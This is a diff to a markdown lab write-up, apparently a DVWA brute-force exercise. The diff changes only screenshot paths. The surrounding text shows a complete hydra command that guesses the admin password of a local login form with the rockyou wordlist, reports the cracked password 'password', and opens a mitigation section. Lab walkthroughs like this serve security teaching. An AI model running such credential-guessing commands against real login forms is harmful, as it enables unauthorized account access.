@@ -35,10 +35,10 @@ brute force attack.
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
 ``` 
 We can see that Hyrda was able to give multiple passwords for the account admin.
-![이미지](/assets/Brtueforce.png)
+![이미지](/assets/sucess.png)
 
 Using one of its credentials, `password` we are able to sucessfully login to the `protected Admin Area`
-![이미지](/assets/sucess.png)
+![이미지](/assets/logedin.png)
 
 ## Mitigating Brute Force Attacks
 The brute force attack was mainly possible due to lack of secure coding. 
